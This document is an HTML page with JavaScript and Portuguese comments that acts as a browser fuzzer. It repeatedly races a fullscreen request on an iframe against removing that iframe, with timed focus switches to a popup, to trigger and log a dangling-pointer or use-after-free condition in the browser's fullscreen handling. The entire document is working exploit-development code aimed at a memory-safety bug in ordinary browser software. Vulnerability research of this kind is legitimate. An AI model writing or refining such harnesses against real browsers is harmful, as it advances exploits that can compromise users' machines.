<html>
<body>
<button id="run">Abrir Popup e Iniciar</button>
<button id="stop">Stop</button>
<div id="status">Ready</div>
<div id="log" style="font-family:monospace;font-size:11px;
     height:250px;overflow-y:auto;border:1px solid #ccc;padding:4px"></div>
<script>
/*
  V4 CORRIGIDO: abre o popup UMA VEZ via gesto do usuário.
  Fuzza o delay entre webkitRequestFullscreen() e iframe.remove()
  sem precisar reabrir popup a cada iteração.
  Popup fica aberto durante todas as rodadas.
*/

var running  = false;
var popup    = null;
var iteration = 0;
var delay1   = 0;    // delay antes do bloco de foco — varia de 0 a 600ms
var delay2   = 300;  // delay fixo entre foco e popup operações

function log(msg) {
    var div  = document.getElementById("log");
    var line = document.createElement("div");
    line.textContent = "[i=" + iteration + " d=" + delay1 + "ms] " + msg;
    div.appendChild(line);
    div.scrollTop = div.scrollHeight;
}

function runIteration() {
    if (!running) return;
    if (!popup || popup.closed) {
        document.getElementById("status").innerHTML = "Popup fechou — stop";
        running = false;
        return;
    }

    iteration++;

    var iframe = document.createElement("iframe");
    iframe.style.cssText = "width:100px;height:100px";
    document.body.appendChild(iframe);

    var focusTimer = null;
    var done = false;

    function finish(msg) {
        if (done) return;
        done = true;
        log(msg);
        if (focusTimer) { clearInterval(focusTimer); focusTimer = null; }
        if (iframe.parentNode) iframe.remove();

        if (iteration % 3 === 0) {
            delay1 = delay1 >= 600 ? 0 : delay1 + 25;
        }
        if (running) setTimeout(runIteration, 500);
    }

    // Monitora dangling pointer via fullscreenchange
    document.addEventListener('webkitfullscreenchange', function onFsChange() {
        document.removeEventListener('webkitfullscreenchange', onFsChange);
        var el = document.webkitFullscreenElement;
        if (el) {
            try {
                finish("DANGLING PTR — tag=" + el.tagName +
                       " clientW=" + el.clientWidth);
            } catch(e) {
                finish("EXCEPTION no dangling: " + e);
            }
        }
    });

    iframe.onload = function() {
        var iDoc = iframe.contentDocument;
        iDoc.open();
        iDoc.write(
            '<!DOCTYPE html><html><body>' +
            '<div style="width:200px;height:150px;background:red"></div>' +
            '</body></html>'
        );
        iDoc.close();

        iDoc.documentElement.webkitRequestFullscreen();

        setTimeout(function() {
            if (!popup || popup.closed) { finish("popup fechou mid-iter"); return; }

            popup.focus();
            window.focus();
            try { iframe.contentWindow.focus(); } catch(e) {}

            setTimeout(function() {
                // Não fecha o popup — só muda foco de volta
                window.focus();

                focusTimer = setInterval(function() {
                    clearInterval(focusTimer);
                    focusTimer = null;

                    var fsBefore = document.webkitFullscreenElement;
                    var preState = fsBefore ? "ACTIVE" : "null";

                    iframe.remove();

                    setTimeout(function() {
                        var fsAfter = document.webkitFullscreenElement;
                        if (fsAfter) {
                            try {
                                finish("POST-REMOVE fs ATIVO! tag=" + fsAfter.tagName +
                                       " w=" + fsAfter.clientWidth +
                                       " [pre=" + preState + "]");
                            } catch(e) {
                                finish("POST-REMOVE EXCEPTION: " + e);
                            }
                        } else {
                            finish("clean [pre=" + preState + "]");
                        }
                    }, 50);
                }, 20);
            }, delay2);
        }, delay1);
    };
}

document.getElementById("run").onclick = function() {
    if (running) return;

    // Popup aberto via gesto direto do usuário — não será bloqueado
    popup = window.open("", "_blank", "width=400,height=300");
    if (!popup) {
        document.getElementById("status").innerHTML = "Popup bloqueado!";
        return;
    }
    popup.document.open();
    popup.document.write(
        '<!DOCTYPE html><html><body>' +
        '<h3>Popup Fuzzer</h3>' +
        '<p>Mantém aberto durante o teste</p>' +
        '</body></html>'
    );
    popup.document.close();

    running   = true;
    iteration = 0;
    delay1    = 0;
    document.getElementById("log").innerHTML = "";
    document.getElementById("status").innerHTML = "Running...";
    runIteration();
};

document.getElementById("stop").onclick = function() {
    running = false;
    if (popup && !popup.closed) popup.close();
    document.getElementById("status").innerHTML =
        "Parado — iter=" + iteration + " último delay=" + delay1 + "ms";
};
</script>
</body>
</html>
